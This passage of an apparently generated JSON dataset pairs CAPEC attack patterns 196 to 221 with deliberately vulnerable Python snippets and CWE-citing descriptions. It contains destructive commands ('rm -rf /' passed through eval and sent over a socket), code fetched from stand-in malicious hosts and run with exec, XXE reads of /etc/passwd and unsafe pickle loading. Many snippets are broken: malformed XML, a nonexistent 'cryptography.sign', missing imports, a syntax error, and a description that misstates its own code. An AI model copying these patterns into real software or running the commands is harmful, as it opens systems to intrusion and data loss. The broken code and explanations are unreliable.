        "description": "This code snippet demonstrates a Principal Spoof attack, where an adversary pretends to be an administrator and sends a spoofed email to a user, attempting to trick them into revealing sensitive information. The code uses weak authentication, reflection attacks, and key exchange without entity authentication to bypass security measures."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "import hashlib\nimport time\nimport os\n\ndef create_session_cookie(username, password):\n    # CWE-1391: Use of Weak Credentials - default key\n    default_key = 'insecure_default_key'\n    session_id = hashlib.sha256((username + password + default_key).encode()).hexdigest()\n    return session_id\n\ndef authenticate(username, password):\n    # CWE-523: Unprotected Transport of Credentials - plaintext transmission\n    if username == 'admin' and password == 'password':\n        return create_session_cookie(username, password)\n    else:\n        return None\n\ndef access_service(session_id):\n    # CWE-613: Insufficient Session Expiration - no expiration\n    # CWE-664: Improper Control of a Resource Through its Lifetime - no control over session lifetime\n    if session_id:\n        return 'Access granted'\n    else:\n        return 'Access denied'\n\n# CWE-384: Session Fixation - authenticating without invalidating existing session\nusername = 'attacker'\npassword = 'password'\nexisting_session_id = 'existing_session_id'\nnew_session_id = create_session_cookie(username, password)\n\n# Forge a new session credential based on the existing one\nforged_session_id = new_session_id\n\nprint(access_service(forged_session_id))",
        "description": "This code snippet demonstrates the CAPEC of forging a session credential to gain unauthorized access. It uses weak credentials, transmits them in plaintext, and fails to expire or control session lifetime, making it vulnerable to session fixation attacks."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    try:\n        ET.fromstring(xml_string)\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\n\nxml_string = \"<!ENTITY a '&&!ENTITY b '&&!ENTITY c '&&!ENTITY d '&&!ENTITY e '&&!ENTITY f '&&!ENTITY g '&&!ENTITY h '&&!ENTITY i '&&!ENTITY j '>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\"\n\nparse_xml(xml_string)",
        "description": "This Python code snippet demonstrates the CAPEC of nested exponential data expansion, which can lead to excessive demands on CPU and memory. The code uses an XML string with recursive entity definitions, which can cause an exponential growth in memory demands. The CWEs related to this CAPEC include CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-776 (Improper Restriction of Recursive Entity References in DTDs), CWE-1102 (Reliance on Machine-Dependent Data Representation), CWE-1093 (Excessively Complex Data Representation), and CWE-1043 (Data Element Aggregating an Excessively Large Number of Non-Primitive Elements)."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.errorhandler(404)\ndef page_not_found(e):\n    return '<h1>Page Not Found</h1><p>The requested URL was not found on the server. The URL you entered was: <script>alert(1)</script>' + flask.request.url + '</p>', 404\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable Flask web application that is susceptible to error-based cross-site scripting (XSS) attacks. When a user requests a non-existent URL, the application returns a 404 error page that includes the requested URL. However, the application does not properly sanitize the URL, allowing an attacker to inject malicious JavaScript code into the error page. This code snippet embodies the main idea of the CAPEC, which involves distributing a malformed link to a third-party web server that contains exploit code, and the related CWEs, including CWE-81, CWE-79, CWE-692, CWE-82, and CWE-80."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "import re\n\ndef validate_input(input_str):\n    forbidden_keywords = ['script', 'javascript', 'vbscript']\n    for keyword in forbidden_keywords:\n        if re.search(keyword, input_str, re.IGNORECASE):\n            return False\n    return True\n\ninput_str = '<ScRiPt>alert(\"XSS\")</ScRiPt>'\nif validate_input(input_str):\n    print(\"Input is valid\")\nelse:\n    print(\"Input is not valid\")",
        "description": "This code snippet demonstrates a vulnerable input validation function that can be bypassed using alternate case structures. The function uses a case-insensitive search to check for forbidden keywords, but it does not convert the input string to a consistent case before the comparison. An attacker can bypass the filter by using an alternate case structure, such as 'ScRiPt', which is not caught by the filter."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "import os\n\ndef unsafe_eval(user_input):\n    # CWE-20: No input validation\n    # CWE-184: Incomplete list of disallowed inputs\n    # CWE-74: Improper neutralization of special elements in output\n    # CWE-182: Collapse of data into unsafe value\n    # CWE-707: Improper neutralization\n    try:\n        # Remove filtering mechanisms\n        user_input = user_input.replace(';', '')\n        # Evaluate user input as Python code\n        result = eval(user_input)\n        return result\n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_input = 'os.system(\"rm -rf /\")'\nprint(unsafe_eval(user_input))",
        "description": "This Python code snippet demonstrates the CAPEC of removing or disabling filtering mechanisms on the target application. The `unsafe_eval` function takes user input and evaluates it as Python code using the `eval` function, without any input validation or sanitization. This allows an attacker to inject malicious code, such as the example usage that deletes all files on the system. The code embodies CWE-20, CWE-184, CWE-74, CWE-182, and CWE-707 by not validating input, having an incomplete list of disallowed inputs, not neutralizing special elements, collapsing data into an unsafe value, and not ensuring structured messages are well-formed."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nclass SerializableClass:\n    def __init__(self, data):\n        self.data = data\n\n    def __getstate__(self):\n        return self.__dict__\n\n    def __setstate__(self, state):\n        self.__dict__.update(state)\n\n# CWE-611: Improper Restriction of XML External Entity Reference\nxml_data = '<!DOCTYPE doc [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><doc>&file;</doc>'\nroot = ET.fromstring(xml_data)\nprint(root.text)\n\n# CWE-502: Deserialization of Untrusted Data\nuntrusted_data = b'\\x80\\x03]q\\x00(X\\x05\\x00\\x00\\x00dataq\\x01X\\x03\\x00\\x00\\x00fileq\\x02X\\x09\\x00\\x00\\x00/etc/passwd'\nserializable_class = SerializableClass(None)\nserializable_class.__setstate__(serializable_class.__getstate__().__setitem__('data', 'file:///etc/passwd'))\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nimport pickle\nuntrusted_pkl = b'\\x80\\x03]q\\x00(X\\x05\\x00\\x00\\x00osq\\x01X\\x03\\x00\\x00\\x00systemq\\x02X\\x05\\x00\\x00\\x00importq\\x03X\\x05\\x00\\x00\\x00osq\\x04X\\x03\\x00\\x00\\x00systemq\\x05X\\x03\\x00\\x00\\x00popenq\\x06X\\x03\\x00\\x00\\x00/etc/passwdq\\x07X\\x03\\x00\\x00\\x00readq\\x08X\\x03\\x00\\x00\\x00printq\\x09'\npickle.loads(untrusted_pkl)\n",
        "description": "This code snippet demonstrates the CAPEC of creating a serialized data file with an external data reference, which can lead to arbitrary file access or connections. It includes CWE-611 by processing an XML document with an external entity reference, CWE-502 by deserializing untrusted data, CWE-829 by including functionality from an untrusted control sphere, and CWE-1070 and CWE-499 by using a serializable class with sensitive data."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "import socket\n\ndef malicious_client():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 8080)\n    sock.connect(server_address)\n    try:\n        # CWE-506: Embedded Malicious Code\n        malicious_code = 'rm -rf /'\n        sock.sendall(malicious_code.encode())\n        # CWE-603: Use of Client-Side Authentication\n        fake_auth_token = 'fake_token'\n        sock.sendall(fake_auth_token.encode())\n        # CWE-1229: Creation of Emergent Resource\n        emergent_resource = 'malicious_file.txt'\n        sock.sendall(emergent_resource.encode())\n    finally:\n        sock.close()\n\nmalicious_client()",
        "description": "A malicious client application that violates the assumptions of a target service. The client sends malicious code, fake authentication tokens, and creates emergent resources, exploiting the service's trust in the client-side enforcement of security mechanisms."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "import winreg\n\ndef modify_registry():\n    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\MyApp', 0, winreg.KEY_SET_VALUE)\n    winreg.SetValueEx(key, 'config', 0, winreg.REG_SZ, 'malicious_config')\n    winreg.CloseKey(key)\n\n# CWE-15: External Control of System or Configuration Setting\n# CWE-314: Cleartext Storage in the Registry\n# CWE-1231: Improper Prevention of Lock Bit Modification\n# CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n# CWE-649: Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking\n\nmodify_registry()",
        "description": "Python code snippet that demonstrates the CAPEC of exploiting a weakness in authorization to modify content within a registry. The code uses the winreg module to access and modify a registry key, illustrating the CWEs related to external control of system settings, cleartext storage, and improper prevention of lock bit modification."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "import requests\n\ncache = {}\n\ndef get_sensitive_data(username, password):\n    if (username, password) not in cache:\n        response = requests.post('https://example.com/login', data={'username': username, 'password': password})\n        cache[(username, password)] = response.text\n    return cache[(username, password)]\n\n# Example usage:\nprint(get_sensitive_data('admin', 'password123'))",
        "description": "This Python code snippet demonstrates the CAPEC of examining a target application's cache for sensitive information. The code uses a cache to store sensitive information (username and password) received from a remote entity, but does not encrypt or protect the cache. An attacker can access the cache and retrieve the sensitive information. This code embodies CWE-524 (Use of Cache Containing Sensitive Information), CWE-311 (Missing Encryption of Sensitive Data), and CWE-525 (Use of Web Browser Cache Containing Sensitive Information)."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-522: Insufficiently Protected Credentials\n    # Storing credentials in plaintext\n    credentials = {'admin': 'password123', 'user': 'password456'}\n    if username in credentials and credentials[username] == password:\n        return True\n    return False\n\n\ndef capture_replay_authentication(sniffed_data):\n    # CWE-294: Authentication Bypass by Capture-replay\n    # Replay the sniffed data to bypass authentication\n    username, password = sniffed_data.split(':')\n    return authenticate(username, password)\n\n\ndef client_side_authentication(username, password):\n    # CWE-603: Use of Client-Side Authentication\n    # Perform authentication on the client-side\n    if username == 'admin' and password == 'password123':\n        return True\n    return False\n\n# CWE-217: Failure to Protect Stored Data from Modification\n# CWE-592: DEPRECATED: Authentication Bypass Issues\n# CWE-522: Insufficiently Protected Credentials\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-603: Use of Client-Side Authentication\n# Example usage:\nusername = 'admin'\npassword = 'password123'\nif client_side_authentication(username, password):\n    print('Authenticated!')\nelse:\n    print('Authentication failed!')",
        "description": "This code snippet demonstrates the CAPEC pattern of retrieving embedded sensitive data, which includes deprecated authentication bypass issues. It showcases CWE-522 by storing credentials in plaintext, CWE-294 by allowing capture-replay attacks, CWE-603 by performing client-side authentication, and CWE-217 by failing to protect stored data from modification. The code is vulnerable to authentication bypass and unauthorized access."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import os\nimport hashlib\nimport cryptography\n\n# CWE-798: Hard-coded credentials\nprivate_key = \"-----BEGIN RSA PRIVATE KEY-----\\nProc-Type: 4,ENCRYPTED\\nDEK-Info: AES-256-CBC,1234567890abcdef\\n...\\n-----END RSA PRIVATE KEY-----\"\n\n# CWE-732: Incorrect permission assignment\nos.chmod(\"/path/to/private/key\", 0o777)\n\n# CWE-494: Download of code without integrity check\nmalicious_code = requests.get(\"https://malicious-website.com/malicious_code.py\").text\n\n# CWE-603: Use of client-side authentication\ndef authenticate():\n    return True\n\n# CWE-506: Embedded malicious code\nmalicious_code += \"\\nimport os\\nos.system('rm -rf /')\"\n\n# Sign the malicious code with the extracted credentials\nhash_object = hashlib.sha256(malicious_code.encode())\nsignature = cryptography.sign(hash_object, private_key)\n\n# Distribute the signed malicious code\nwith open(\"malicious_code_signed.py\", \"w\") as f:\n    f.write(malicious_code + \"\\n# Signature: \" + signature.decode())",
        "description": "This code snippet demonstrates the CAPEC where an adversary extracts credentials used for code signing from a production environment and uses them to sign malicious content. The code includes CWE-798 hard-coded credentials, CWE-732 incorrect permission assignment, CWE-494 download of code without integrity check, CWE-603 use of client-side authentication, and CWE-506 embedded malicious code. The malicious code is signed with the extracted credentials and distributed, allowing the adversary to execute arbitrary code on the victim's computer."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "import hashlib\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-603: Use of Client-Side Authentication\n# CWE-807: Reliance on Untrusted Inputs in a Security Decision\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-494: Download of Code Without Integrity Check\n\ndef authenticate_user(username, password):\n    # Client-side authentication, no server-side validation\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\n\n# Download and execute code from untrusted source without integrity check\ndef download_and_execute_code(url):\n    import requests\n    code = requests.get(url).text\n    exec(code)\n\n# Rely on client-side input for security decision\ndef is_admin(username):\n    # No server-side validation, relies on client-side input\n    if username == 'admin':\n        return True\n    else:\n        return False\n\n# Include functionality from untrusted control sphere\ndef include_untrusted_library(url):\n    import requests\n    code = requests.get(url).text\n    exec(code)\n\n# Example usage\nusername = 'admin'\npassword = 'password'\nif authenticate_user(username, password):\n    print('Authenticated!')\n    download_and_execute_code('http://untrusted-source.com/malicious_code.py')\n    if is_admin(username):\n        print('You are an admin!')\n        include_untrusted_library('http://untrusted-source.com/malicious_library.py')",
        "description": "This code snippet demonstrates the CAPEC 'An adversary removes or disables functionality on the client that the server assumes to be present and trustworthy.' by showcasing multiple CWEs. It includes client-side authentication without server-side validation, reliance on untrusted inputs for security decisions, inclusion of functionality from untrusted control spheres, and download of code without integrity checks. An adversary can exploit these vulnerabilities to bypass security mechanisms and execute malicious code."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "import json\n\ndef calculate_total_cost(price, quantity):\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    # CWE-682: Incorrect Calculation\n    # CWE-1284: Improper Validation of Specified Quantity in Input\n    if quantity < 0:\n        quantity = 1  # Misinterpretation of Input (CWE-115)\n    total_cost = price * quantity\n    return total_cost\n\n# CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\ncookie = {'user_id': '123', 'item_price': 10.99}\n\nitem_price = cookie['item_price']\nquantity = 5\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-682: Incorrect Calculation\n# CWE-1284: Improper Validation of Specified Quantity in Input\n# CWE-115: Misinterpretation of Input\n# CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\ntotal_cost = calculate_total_cost(item_price, quantity)\n\nprint(json.dumps({'total_cost': total_cost}))",
        "description": "This code snippet demonstrates the CAPEC where an attacker can manipulate the client-side logic for monetary calculations, leading to incorrect information being sent to the server. The code includes vulnerabilities related to CWE-602, CWE-682, CWE-1284, CWE-784, and CWE-115."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "import os\n\n# CWE-20: Improper Input Validation\nfilename = input('Enter a file name: ')\n\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\nif filename.endswith('.txt'):\n    # CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n    with open(filename, 'w') as f:\n        f.write('<script>alert(\"XSS\");</script>')\n\n# CWE-82: Improper Neutralization of Script in Attributes of IMG Tags in a Web Page\nimg_tag = '<img src=\"{}\" onerror=\"alert(\\'XSS\\');\">'.format(filename)\n\n# CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page\nencoded_uri = '%73cript%3aalert%28%22XSS%22%29'\n\n# CAPEC: MIME Type Confusion\nos.system('echo \"Content-Type: text/plain\" > {}.mime'.format(filename))",
        "description": "This Python code snippet demonstrates a MIME type confusion vulnerability. It takes a file name as input, creates a file with scripting content but specifies a MIME type of 'text/plain', and then serves the file. A browser that does not invoke script filters before switching to using an interpreter for the real content type may execute the script, leading to a cross-site scripting (XSS) vulnerability."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/image', methods=['GET'])\ndef get_image():\n    img_url = request.args.get('src')\n    return '<img src=\"' + img_url + '\" />'\n\n@app.route('/activeX', methods=['GET'])\ndef get_activeX():\n    return '<object id=\"myControl\" classid=\"clsid:...\" ></object>'\n\n@app.errorhandler(404)\ndef page_not_found(e):\n    return '<h1>Error 404: Page Not Found</h1><p>The requested URL was not found on the server.</p><p>Debug info: ' + str(e) + '</p>', 404\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet demonstrates a vulnerable web application that is susceptible to multiple security vulnerabilities. The get_image function is vulnerable to Cross-Site Scripting (CWE-79) as it does not properly sanitize the user input. The get_activeX function exposes an unsafe ActiveX method (CWE-618). The error handler function page_not_found is missing a custom error page (CWE-7) and displays sensitive information about the product. The application also lacks a denylist-based protection mechanism, making it vulnerable to XSS attacks (CWE-692). Additionally, the application does not neutralize script in attributes of IMG tags (CWE-82)."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-1242: Inclusion of Undocumented Features or Chicken Bits\nundocumented_feature = os.popen('cat /proc/cpuinfo').read()\nprint(undocumented_feature)\n\n# CWE-1246: Improper Write Handling in Limited-write Non-Volatile Memories\nlimited_write_memory = '/dev/mtdblock0'\nwith open(limited_write_memory, 'w') as f:\n    f.write(b'\\x00' * 1024 * 1024)\n\n# CWE-1281: Sequence of Processor Instructions Leads to Unexpected Behavior\ndef unexpected_behavior():\n    while True:\n        ctypes.CDLL(None).printf(b'\\x90' * 1024)\nunexpected_behavior()\n\n# CWE-695: Use of Low-Level Functionality\nlow_level_functionality = ctypes.CDLL(None).syscall(548, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)\nprint(low_level_functionality)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_system_info = os.popen('cat /sys/kernel/debug/tracing/trace').read()\nprint(sensitive_system_info)",
        "description": "This Python code snippet demonstrates the CAPEC of leveraging legitimate capabilities of an application to achieve a negative technical impact. It includes undocumented features, improperly handles limited-write non-volatile memories, leads to unexpected behavior through a sequence of processor instructions, uses low-level functionality, and exposes sensitive system information to unauthorized control spheres."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    return open(os.path.join('/var/www/html', file_path)).read()\n\nfile_path = '../etc/passwd'\nprint(read_file(file_path))",
        "description": "This Python code snippet demonstrates a path traversal vulnerability. The `read_file` function takes a `file_path` as input and reads the file at the joined path. However, it does not properly sanitize the input, allowing an attacker to traverse outside the restricted directory by providing a path like `../etc/passwd`. This can lead to unauthorized access to sensitive files."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import socket\n\n# CWE-7: J2EE Misconfiguration: Missing Custom Error Page\ntry:\n    # CWE-106: Struts: Plug-in Framework not in Use\n    # No input validation\n    user_input = input('Enter your name: ')\n    print('Hello, ' + user_input)\n\n    # CWE-246: J2EE Bad Practices: Direct Use of Sockets\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('localhost', 8080))\n    s.send(b'Hello, server!')\n    response = s.recv(1024)\n    print(response.decode('utf-8'))\n\nexcept Exception as e:\n    # CWE-534: DEPRECATED: Information Exposure Through Debug Log Files\n    # Logging sensitive information\n    print('Error: ', e)\n    # CWE-545: DEPRECATED: Use of Dynamic Class Loading\n    # Dynamic class loading (not recommended)\n    module_name = 'my_module'\n    class_name = 'MyClass'\n    module = __import__(module_name)\n    my_class = getattr(module, class_name)\n    obj = my_class()\n    obj.do_something()",
        "description": "This code snippet demonstrates a Python application that embodies the main idea of the deprecated CAPEC, which involves fuzzing for application mapping. The code includes several CWEs, such as missing custom error pages, lack of input validation, direct use of sockets, and information exposure through debug log files. Additionally, it includes deprecated CWEs like use of dynamic class loading."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "import logging\nimport os\nimport socket\n\n# CWE-209: Generation of Error Message Containing Sensitive Information\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\ntry:\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    sensitive_info = os.environ['SECRET_KEY']\n    # CWE-210: Self-generated Error Message Containing Sensitive Information\n    logging.error(f'Error occurred: {sensitive_info}')\n\n    # CWE-211: Externally-Generated Error Message Containing Sensitive Information\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('example.com', 80))\n    sock.send(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n    response = sock.recv(1024)\n    logging.error(f'Response from server: {response.decode()})\n\nexcept Exception as e:\n    # CWE-532: Insertion of Sensitive Information into Log File\n    logging.error(f'An error occurred: {e}, Sensitive info: {sensitive_info}')",
        "description": "This code snippet demonstrates a vulnerable Python application that is susceptible to fuzzing attacks. It logs sensitive information, such as environment variables and system information, to a log file. The application also sends sensitive information to an external server, which can be accessed by an unauthorized actor. The code is designed to generate error messages that contain sensitive information, making it vulnerable to CWE-209, CWE-210, CWE-211, CWE-497, and CWE-532."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "import socket\n\n# CWE-306: Missing Authentication for Critical Function\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-514: Covert Channel\n\ndef send_unverified_message(message):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 12345)\n    sock.connect(server_address)\n    sock.sendall(message.encode())\n    response = sock.recv(1024)\n    print(response.decode())\n\n# No authentication or verification of the source of the communication channel\nsend_unverified_message('Hello, server!')",
        "description": "This Python code snippet demonstrates the CAPEC of manipulating a setting or parameter on a communications channel to compromise its security. It lacks authentication for critical functions, does not ensure message integrity during transmission, and does not properly verify the source of the communication channel. This allows an adversary to potentially inject malicious data, eavesdrop, or even take control of the communication channel."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import socket\nimport ssl\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-940: Improper Verification of Source of a Communication Channel\n\ndef send_data_over_insecure_channel(data):\n    # Establish an insecure SSL/TLS connection\n    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)\n    context.check_hostname = False\n    context.verify_mode = ssl.CERT_NONE\n    \n    # CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    # Connect to a potentially malicious server\n    with socket.create_connection((\"malicious-server.com\", 443)) as sock:\n        with context.wrap_socket(sock, server_hostname=\"malicious-server.com\") as ssock:\n            # CWE-201: Insertion of Sensitive Information Into Sent Data\n            # Send sensitive data over the insecure channel\n            ssock.sendall(b\"username=password\\n\")\n            \n            # CWE-294: Authentication Bypass by Capture-replay\n            # CWE-940: Improper Verification of Source of a Communication Channel\n            # Receive and process data from the malicious server without proper verification\n            data = ssock.recv(1024)\n            print(\"Received data from server: \" + data.decode())\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# Rely on the client to implement security mechanisms\nsend_data_over_insecure_channel(b\"username=password\\n\")",
        "description": "This Python code snippet demonstrates a vulnerable SSL/TLS communication channel that allows an adversary to access sensitive data or inject malicious commands. The code establishes an insecure SSL/TLS connection, sends sensitive data over the channel, and receives data from a potentially malicious server without proper verification."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport soapclient\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-112: Missing XML Validation\n\n# Assume 'soap_client' is a legitimate SOAP client\nsoap_client = soapclient.SOAPClient('http://legitimate_business/soap_endpoint')\n\n# Attacker spoofs the UDDI message to impersonate the legitimate business\nspoofed_uddi_message = ET.Element('businessEntity')\nspoofed_uddi_message.set('businessKey', 'attacker_business_key')\nspoofed_uddi_message.set('name', 'Attacker Business')\n\n# CWE-112: Missing XML Validation - the XML is not validated against a schema\nsoap_client.send(spoofed_uddi_message)\n\n# CWE-345: Insufficient Verification of Data Authenticity - the receiver does not verify the authenticity of the message\n# CWE-941: Incorrectly Specified Destination in a Communication Channel - the receiver does not correctly specify the intended destination\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel - the receiver does not ensure the message integrity during transmission\n# CWE-300: Channel Accessible by Non-Endpoint - the receiver does not adequately verify the identity of the actor at the other end of the channel",
        "description": "Python code snippet demonstrating the CAPEC where an attacker spoofs a UDDI message to impersonate a legitimate business in an e-business transaction, exploiting CWE-345, CWE-941, CWE-924, CWE-300, and CWE-112."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport requests\n\n# CWE-112: Missing XML Validation\nxml_data = '<root><node>malicious_data</node></root>'\nroot = ET.fromstring(xml_data)\n\n# CWE-611: Improper Restriction of XML External Entity Reference\nxml_data = '<!ENTITY ext SYSTEM \"http://example.com/malicious.dtd\"><root><node>&ext;</node></root>'\nroot = ET.fromstring(xml_data)\n\n# CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')\nxpath_expr = \"//node[\" + input('Enter node name: ') + \"]\"\nroot.findall(xpath_expr)\n\n# CWE-610: Externally Controlled Reference to a Resource in Another Sphere\nws_routing = {'http://example.com/route1': 'http://example.com/route2'}\n\n# CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\ndef forward_request(url):\n    return requests.post(url, data={'data': 'malicious_data'})\n\n# XML Routing Detour Attack\nintermediate_system = 'http://example.com/intermediate'\nfinal_destination = 'http://example.com/final'\n\nxml_data = '<root><node>original_data</node></route><route><node>http://example.com/route1</node></route></root>'\nroot = ET.fromstring(xml_data)\n\n# Compromised intermediate system\nroot.find('.//route/node').text = intermediate_system\n\n# Forward request to compromised system\nforward_request(intermediate_system)\n\n# Modify response and forward to final destination\nresponse = '<root><node>modified_data</node></root>'\nroot = ET.fromstring(response)\nforward_request(final_destination)",
        "description": "This Python code snippet demonstrates an XML Routing Detour Attack (CAPEC-94) by exploiting multiple CWEs. It starts by missing XML validation (CWE-112), then uses an external entity reference to access an external resource (CWE-611). It also performs XPath injection (CWE-643) and uses an externally controlled reference to a resource in another sphere (CWE-610). The code then acts as an unintended proxy or intermediary (CWE-441) to forward requests and modify responses, ultimately leading to an XML Routing Detour Attack."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-246: Direct use of sockets\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# CWE-602: Client-side enforcement of server-side security\n# Client is responsible for encrypting the data\nencrypted_data = encrypt_data('secret_key', 'hello, world!')\n\n# CWE-294: Authentication bypass by capture-replay\n# Server does not verify the authenticity of the message\nsock.connect(('localhost', 8080))\nsock.send(encrypted_data)\n\n# CWE-941: Incorrectly specified destination in a communication channel\n# Server is not correctly specifying the destination for the request\nresponse = sock.recv(1024)\n\n# CWE-757: Selection of less-secure algorithm during negotiation\n# Client and server negotiate to use a weaker encryption algorithm\nweaker_encrypted_data = encrypt_data('weaker_secret_key', 'hello, world!')\nsock.send(weaker_encrypted_data)\n\n# CWE-294: Authentication bypass by capture-replay\n# Attacker can capture and replay the encrypted data to bypass authentication\nsock.close()\n",
        "description": "This code snippet demonstrates a vulnerable communication protocol between a client and a server. The client directly uses sockets to communicate with the server, which is a bad practice. The client is responsible for encrypting the data, but the server does not verify the authenticity of the message, making it vulnerable to authentication bypass by capture-replay. The client and server also negotiate to use a weaker encryption algorithm, making it vulnerable to selection of less-secure algorithm during negotiation. Additionally, the server does not correctly specify the destination for the request, making it vulnerable to incorrectly specified destination in a communication channel."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_file):\n    tree = ET.parse(xml_file)\n    root = tree.getroot()\n    for elem in root.iter():\n        if elem.tag == '{http://example.com}entity':\n            uri = elem.attrib['uri']\n            # No validation or restriction on the URI\n            response = requests.get(uri)\n            elem.text = response.text\n    return ET.tostring(root, encoding='unicode')\n\n# Example usage\nxml_file = 'exploit.xml'\nprint(process_xml(xml_file))",
        "description": "This Python code snippet demonstrates a denial of service vulnerability through XML entity expansion. The code parses an XML file, iterates over its elements, and for each element with a specific tag, it sends a GET request to the URI specified in the 'uri' attribute. The response is then embedded into the XML element. There is no validation or restriction on the URI, allowing an attacker to specify a URI that consumes a large amount of resources, leading to a denial of service condition."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
